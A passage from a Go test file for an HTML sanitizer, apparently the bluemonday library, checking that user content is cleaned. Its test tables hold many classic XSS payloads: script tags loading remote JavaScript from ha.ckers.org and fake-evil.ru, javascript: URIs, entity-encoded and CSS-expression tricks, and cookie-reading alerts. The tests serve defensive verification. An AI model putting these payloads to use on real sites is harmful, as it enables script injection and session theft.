			expected: `AqC2sr44HVueGzgW13zHvJkqOEBWA8XA66ZEb3EoL1ehypSnJ07cFoWZlO8kf3k57L1fuHFWJ6quEdLXQaT9SJKHlUaYQvanvjbBlqWwaH3hODNsBGoK0DatpoQ+FxcSkdVE/ki3rbEUuJiZzU0BnDxH+Q6FiNsBaJuwau29w24MlD28ELJsjCcUVwtTQkaNtUxIlFKHLj0++T+IVrQH8KZlmVLvDefJ6llWbrFNVuh674HfKr/GEUatG6KI4gWNtGKKRYh76mMl5xH5qDfBZqxyRaKylJaDIYbx5xP5I4DDm4gOnxH+h/Pu6dq6FJ/U3eDio/KQ9xwFqTuyjH0BIRBsvWWgbTNURVBheq+am92YBhkj1QmdKTxQ9fQM55O8DpyWzRhky0NevM9j`,
		},
		{
			in:       `qkFfS3WfLyj3QTQT9i/s57uOPQCTN1jrab8bwxaxyeYUlz2tEtYyKGGUufua8WzdBT2VvWTvH0JkK0LfUJ+vChvcnMFna+tEaCKCFMIOWMLYVZSJDcYMIqaIr8d0Bi2bpbVf5z4WNma0pbCKaXpkYgeg1Sb8HpKG0p0fAez7Q/QRASlvyM5vuIOH8/CM4fF5Ga6aWkTRG0lfxiyeZ2vi3q7uNmsZF490J79r/6tnPPXIIC4XGnijwho5NmhZG0XcQeyW5KnT7VmGACFdTHOb9oS5WxZZU29/oZ5Y23rBBoSDX/xZ1LNFiZk6Xfl4ih207jzogv+3nOro93JHQydNeKEwxOtbKqEe7WWJLDw/EzVdJTODrhBYKbjUce10XsavuiTvv+H1Qh4lo2Vx`,
			expected: `qkFfS3WfLyj3QTQT9i/s57uOPQCTN1jrab8bwxaxyeYUlz2tEtYyKGGUufua8WzdBT2VvWTvH0JkK0LfUJ+vChvcnMFna+tEaCKCFMIOWMLYVZSJDcYMIqaIr8d0Bi2bpbVf5z4WNma0pbCKaXpkYgeg1Sb8HpKG0p0fAez7Q/QRASlvyM5vuIOH8/CM4fF5Ga6aWkTRG0lfxiyeZ2vi3q7uNmsZF490J79r/6tnPPXIIC4XGnijwho5NmhZG0XcQeyW5KnT7VmGACFdTHOb9oS5WxZZU29/oZ5Y23rBBoSDX/xZ1LNFiZk6Xfl4ih207jzogv+3nOro93JHQydNeKEwxOtbKqEe7WWJLDw/EzVdJTODrhBYKbjUce10XsavuiTvv+H1Qh4lo2Vx`,
		},
		{
			in:       `O900/Gn82AjyLYqiWZ4ILXBBv/ZaXpTpQL0p9nv7gwF2MWsS2OWEImcVDa+1ElrjUumG6CVEv/rvax53krqJJDg+4Z/XcHxv58w6hNrXiWqFNjxlu5RZHvj1oQQXnS2n8qw8e/c+8ea2TiDIVr4OmgZz1G9uSPBeOZJvySqdgNPMpgfjZwkL2ez9/x31sLuQxi/FW3DFXU6kGSUjaq8g/iGXlaaAcQ0t9Gy+y005Z9wpr2JWWzishL+1JZp9D4SY/r3NHDphN4MNdLHMNBRPSIgfsaSqfLraIt+zWIycsd+nksVxtPv9wcyXy51E1qlHr6Uygz2VZYD9q9zyxEX4wRP2VEewHYUomL9d1F6gGG5fN3z82bQ4hI9uDirWhneWazUOQBRud5otPOm9`,
			expected: `O900/Gn82AjyLYqiWZ4ILXBBv/ZaXpTpQL0p9nv7gwF2MWsS2OWEImcVDa+1ElrjUumG6CVEv/rvax53krqJJDg+4Z/XcHxv58w6hNrXiWqFNjxlu5RZHvj1oQQXnS2n8qw8e/c+8ea2TiDIVr4OmgZz1G9uSPBeOZJvySqdgNPMpgfjZwkL2ez9/x31sLuQxi/FW3DFXU6kGSUjaq8g/iGXlaaAcQ0t9Gy+y005Z9wpr2JWWzishL+1JZp9D4SY/r3NHDphN4MNdLHMNBRPSIgfsaSqfLraIt+zWIycsd+nksVxtPv9wcyXy51E1qlHr6Uygz2VZYD9q9zyxEX4wRP2VEewHYUomL9d1F6gGG5fN3z82bQ4hI9uDirWhneWazUOQBRud5otPOm9`,
		},
		{
			in:       `C3c+d5Q9lyTafPLdelG1TKaLFinw1TOjyI6KkrQyHKkttfnO58WFvScl1TiRcB/iHxKahskoE2+VRLUIhctuDU4sUvQh/g9Arw0LAA4QTxuLFt01XYdigurz4FT15ox2oDGGGrRb3VGjDTXK1OWVJoLMW95EVqyMc9F+Fdej85LHE+8WesIfacjUQtTG1tzYVQTfubZq0+qxXws8QrxMLFtVE38tbeXo+Ok1/U5TUa6FjWflEfvKY3XVcl8RKkXua7fVz/Blj8Gh+dWe2cOxa0lpM75ZHyz9adQrB2Pb4571E4u2xI5un0R0MFJZBQuPDc1G5rPhyk+Hb4LRG3dS0m8IASQUOskv93z978L1+Abu9CLP6d6s5p+BzWxhMUqwQXC/CCpTywrkJ0RG`,
			expected: `C3c+d5Q9lyTafPLdelG1TKaLFinw1TOjyI6KkrQyHKkttfnO58WFvScl1TiRcB/iHxKahskoE2+VRLUIhctuDU4sUvQh/g9Arw0LAA4QTxuLFt01XYdigurz4FT15ox2oDGGGrRb3VGjDTXK1OWVJoLMW95EVqyMc9F+Fdej85LHE+8WesIfacjUQtTG1tzYVQTfubZq0+qxXws8QrxMLFtVE38tbeXo+Ok1/U5TUa6FjWflEfvKY3XVcl8RKkXua7fVz/Blj8Gh+dWe2cOxa0lpM75ZHyz9adQrB2Pb4571E4u2xI5un0R0MFJZBQuPDc1G5rPhyk+Hb4LRG3dS0m8IASQUOskv93z978L1+Abu9CLP6d6s5p+BzWxhMUqwQXC/CCpTywrkJ0RG`,
		},
		// Basic XSS
		{
			in:       `test<script>alert(document.cookie)</script>`,
			expected: `test`,
		},
		{
			in:       `<<<><<script src=http://fake-evil.ru/test.js>`,
			expected: `&lt;&lt;&lt;&gt;&lt;`,
		},
		{
			in:       `<script<script src=http://fake-evil.ru/test.js>>`,
			expected: `&gt;`,
		},
		{
			in:       `<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
			expected: ``,
		},
		{
			in:       `<BODY ONLOAD=alert('XSS')>`,
			expected: ``,
		},
		{
			in:       `<iframe src=http://ha.ckers.org/scriptlet.html <`,
			expected: ``,
		},
		{
			in:       `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"">`,
			expected: `<input type="IMAGE">`,
		},
		{
			in:       `<a onblur="alert(secret)" href="http://www.google.com">Google</a>`,
			expected: `<a href="http://www.google.com">Google</a>`,
		},
		// IMG attacks
		{
			in:       `<img src="http://www.myspace.com/img.gif"/>`,
			expected: `<img src="http://www.myspace.com/img.gif"/>`,
		},
		{
			in:       `<img src=javascript:alert(document.cookie)>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="javascript:alert('XSS')"`,
			expected: ``,
		},
		{
			in:       `<IMG LOWSRC="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<BGSOUND SRC="javascript:alert('XSS');">`,
			expected: ``,
		},
		// HREF attacks
		{
			in:       `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">`,
			expected: ``,
		},
		{
			in:       `<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>`,
			expected: ``,
		},
		{
			in:       `<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>`,
			expected: ``,
		},
		{
			in:       `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS`,
			expected: `<ul><li>XSS`,
		},
		{
			in:       `<IMG SRC='vbscript:msgbox("XSS")'>`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
			expected: ``,
		},
		{
			in:       `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
			expected: ``,
		},
		{
			in:       `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
			expected: ``,
		},
		{
			in:       `<TABLE BACKGROUND="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
			expected: `<td>`,
		},
		{
			in:       `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
			expected: `<div>`,
		},
		{
			in:       `<DIV STYLE="width: expression(alert('XSS'));">`,
			expected: `<div>`,
		},
		{
			in:       `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
			expected: ``,
		},
		{
			in:       `<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>`,
			expected: ``,
		},
		{
			in:       `<BASE HREF="javascript:alert('XSS');//">`,
			expected: ``,
		},
		{
			in:       `<BaSe hReF="http://arbitrary.com/">`,
			expected: ``,
		},
		{
			in:       `<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>`,
			expected: ``,
		},
		{
			in:       `<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>`,
			expected: ``,
		},
		{
			in:       `<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>`,
			expected: ``,
		},
		{
			in:       `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: `PT SRC=&#34;http://ha.ckers.org/xss.js&#34;&gt;`,
		},
		{
			in:       `<SCRIPT SRC=http://ha.ckers.org/xss.js`,
			expected: ``,
		},
		{
			in:       `<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>`,
			expected: `<div>`,
		},
		{
			in:       `<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>`,
			expected: ``,
		},
		{
			in:       `<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->`,
			expected: `test--&gt;`,
		},
		{
			in:       `<a></a style="xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">`,
			expected: ``,
		},
		// CSS attacks
		{
			in:       `<div style="position:absolute">`,
			expected: `<div>`,
		},
		{
			in:       `<style>b { position:absolute }</style>`,
			expected: ``,
		},
		{
			in:       `<div style="z-index:25">test</div>`,
			expected: `<div>test</div>`,
		},
		{
			in:       `<style>z-index:25</style>`,
			expected: ``,
		},
		// Strings that cause issues for tokenizers
		{
			in:       `<a - href="http://www.test.com">`,
			expected: `<a href="http://www.test.com">`,
		},
		// Comments
		{
			in:       `text <!-- comment -->`,
			expected: `text `,
		},
		{
			in:       `<div>text <!-- comment --></div>`,
			expected: `<div>text </div>`,
		},
		{
			in:       `<div>text <!--[if IE]> comment <[endif]--></div>`,
			expected: `<div>text </div>`,
		},
		{
			in:       `<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>`,
			expected: `<div>text &lt;[endif]--&gt;</div>`,
		},
		{
			in:       `<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>`,
			expected: `<div>text  comment &lt;[endif]--&gt;</div>`,
		},
		{
			in:       `<div>text <!-- [ if lte 6 ]>\ncomment <[ endif\n]--></div>`,
			expected: `<div>text </div>`,
		},
		{
			in:       `<div>text <![if !IE]> comment <![endif]></div>`,
			expected: `<div>text  comment </div>`,
		},
		{
			in:       `<div>text <![ if !IE]> comment <![endif]></div>`,
			expected: `<div>text  comment </div>`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestXSS(t *testing.T) {

	p := UGCPolicy()

	tests := []test{
		{
			in:       `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`,
			expected: `XSS`,
		},
		{
			in: `<A HREF="h
tt	p://6	6.000146.0x7.147/">XSS</A>`,
			expected: `XSS`,
		},
		{
			in:       `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: `PT SRC=&#34;http://ha.ckers.org/xss.js&#34;&gt;`,
		},
		{
			in:       `<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
			expected: ``,
		},
		{
			in:       `<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS')`,
			expected: ` +ADw-SCRIPT+AD4-alert(&#39;XSS&#39;)`,
		},
		{
			in:       `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`,
			expected: ``,
		},
		{
			in: `<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>`,
			expected: `alert(&#34;XSS&#34;)&#39;); ?&gt;`,
		},
		{
			in:       `<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->`,
			expected: ``,
		},
		{
			in: `<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>`,
			expected: "\n\n\n&#34;&gt;\n",
		},
		{
			in: `<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`,
			expected: `
<span></span>`,
		},
		{
			in: `<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>`,
			expected: `<i><b></b></i>
<span></span>`,
		},
		{
			in:       `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
			expected: ``,
		},
		{
			in:       `<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>`,
			expected: ``,
		},
		{
			in:       `<BASE HREF="javascript:alert('XSS');//">`,
			expected: ``,
		},
		{
			in:       `<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->`,
			expected: ``,
		},
		{
			in:       `<DIV STYLE="width: expression(alert('XSS'));">`,
			expected: `<div>`,
		},
		{
			in:       `<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`,
			expected: `<div>`,
		},
		{
			in:       `<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`,
			expected: `<div>`,
		},
		{
			in:       `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
			expected: `<div>`,
		},
		{
			in:       `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
			expected: `<table><td>`,
		},
		{
			in:       `<TABLE BACKGROUND="javascript:alert('XSS')">`,
			expected: `<table>`,
		},
		{
			in:       `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
			expected: ``,
		},
		{
			in:       `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
			expected: ``,
		},
		{
			in:       `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<XSS STYLE="behavior: url(xss.htc);">`,
			expected: ``,
		},
		{
			in:       `<XSS STYLE="xss:expression(alert('XSS'))">`,
			expected: ``,
		},
		{
			in:       `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
			expected: ``,
		},
		{
			in:       `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
			expected: ``,
		},
		{
			in:       `<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
			expected: ``,
		},
		{
			in:       `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
			expected: ``,
		},
		{
			in:       `<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`,
			expected: ``,
		},
		{
			in:       `<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">`,
			expected: ``,
		},
		{
			in:       `<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>`,
			expected: ``,
		},
		{
			in:       `<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">`,
			expected: ``,
		},
		{
			in:       `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<BR SIZE="&{alert('XSS')}">`,
			expected: `<br>`,
		},
		{
			in:       `<BGSOUND SRC="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<BODY ONLOAD=alert('XSS')>`,
			expected: ``,
		},
		{
			in:       `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
			expected: `<ul><li>XSS</br>`,
		},
		{
			in:       `<IMG LOWSRC="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<IMG DYNSRC="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<BODY BACKGROUND="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
			expected: ``,
		},
		{
			in:       `\";alert('XSS');//`,
			expected: `\&#34;;alert(&#39;XSS&#39;);//`,
		},
		{
			in:       `<iframe src=http://ha.ckers.org/scriptlet.html <`,
			expected: ``,
		},
		{
			in:       `<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >`,
			expected: ``,
		},
		{
			in:       `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
			expected: `&lt;`,
		},
		{
			in:       "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
			expected: ``,
		},
		{
			in:       `<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="jav	ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
			expected: ``,
		},
		{
			in: `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
			expected: ``,
		},
		{
			in: `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
			expected: `<img src="/"></img>`,
		},
		{
			in:       `<IMG onmouseover="alert('xxs')">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC= onmouseover="alert('xxs')">`,
			expected: `<img src="onmouseover=%22alert%28%27xxs%27%29%22">`,
		},
		{
			in:       `<IMG SRC=# onmouseover="alert('xxs')">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
			expected: ``,
		},
		{
			in:       `<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
			expected: `&#34;&gt;`,
		},
		{
			in:       `<IMG SRC=javascript:alert("XSS")>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=javascript:alert('XSS')>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `'';!--"<XSS>=&{()}`,
			expected: `&#39;&#39;;!--&#34;=&amp;{()}`,
		},
		{
			in:       `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
			expected: `&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&#34;;alert(String.fromCharCode(88,83,83))//&#34;;alert(String.fromCharCode(88,83,83))//--&gt;&#34;&gt;&#39;&gt;`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestAllowNoAttrs(t *testing.T) {
	input := "<tag>test</tag>"
	outputFail := "test"
	outputOk := input

	p := NewPolicy()
	p.AllowElements("tag")

	if output := p.Sanitize(input); output != outputFail {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputFail,
		)
	}

	p.AllowNoAttrs().OnElements("tag")

	if output := p.Sanitize(input); output != outputOk {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputOk,
		)
	}
}

func TestSkipElementsContent(t *testing.T) {
	input := "<tag>test</tag>"
	outputFail := "test"
	outputOk := ""

	p := NewPolicy()

	if output := p.Sanitize(input); output != outputFail {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputFail,
		)
	}

	p.SkipElementsContent("tag")

	if output := p.Sanitize(input); output != outputOk {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputOk,
		)
	}
}

func TestTagSkipClosingTagNested(t *testing.T) {
	input := "<tag1><tag2><tag3>text</tag3></tag2></tag1>"
	outputOk := "<tag2>text</tag2>"

	p := NewPolicy()
	p.AllowElements("tag1", "tag3")
	p.AllowNoAttrs().OnElements("tag2")

	if output := p.Sanitize(input); output != outputOk {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputOk,
		)
	}
}

func TestAddSpaces(t *testing.T) {
	p := UGCPolicy()
	p.AddSpaceWhenStrippingTag(true)

	tests := []test{
		{
			in:       `<foo>Hello</foo><bar>World</bar>`,
			expected: ` Hello  World `,
		},
		{
			in:       `<p>Hello</p><bar>World</bar>`,
			expected: `<p>Hello</p> World `,
		},
		{
			in:       `<p>Hello</p><foo /><p>World</p>`,
			expected: `<p>Hello</p> <p>World</p>`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestTargetBlankNoOpener(t *testing.T) {
	p := UGCPolicy()
	p.AddTargetBlankToFullyQualifiedLinks(true)
	p.AllowAttrs("target").Matching(Paragraph).OnElements("a")

	tests := []test{
		{
			in:       `<a href="/path" />`,
			expected: `<a href="/path" rel="nofollow"/>`,
		},
		{
			in:       `<a href="/path" target="_blank" />`,
			expected: `<a href="/path" target="_blank" rel="nofollow noopener"/>`,
		},
		{
			in:       `<a href="/path" target="foo" />`,
			expected: `<a href="/path" target="foo" rel="nofollow"/>`,
		},
